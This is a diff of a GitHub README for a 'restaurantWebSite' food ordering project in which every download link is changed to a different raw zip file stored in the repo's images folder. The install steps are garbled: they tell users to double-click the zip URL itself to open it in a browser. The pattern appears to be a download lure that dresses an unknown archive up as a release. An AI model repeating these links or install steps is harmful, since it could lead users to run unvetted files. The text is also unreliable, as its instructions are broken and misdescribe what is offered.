@@ -1,7 +1,7 @@
 # 🍽️ restaurantWebSite - Your Easy Online Food Ordering Solution
 
 ## 📥 Download Now
-[![Download](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip%https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip)](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip)
+[![Download](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip%https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip)](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the restaurantWebSite! This project aims to provide a simple and effective online platform for food ordering. Whether you're a restaurant owner looking to enhance your online presence or a user wanting to make ordering food easier, this website can help you.
@@ -19,7 +19,7 @@ Before you start, ensure that you have the following:
 - No installation of special software is needed.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip) to download the latest version of the restaurantWebSite. Follow these simple steps:
+To get started, visit our [Releases page](https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip) to download the latest version of the restaurantWebSite. Follow these simple steps:
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -32,8 +32,8 @@ Once you've downloaded the website:
 
 1. Locate the downloaded file on your computer.
 2. Unzip the file if it is compressed.
-3. Open the folder to find the https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip file.
-4. Double-click the https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Web-Site-restaurant-v2.9.zip file to open it in your web browser.
+3. Open the folder to find the https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip file.
+4. Double-click the https://github.com/EstebanFortini/restaurantWebSite/raw/refs/heads/main/images/Site_restaurant_Web_v1.1.zip file to open it in your web browser.
 
 Your restaurant website is now ready to use!
 
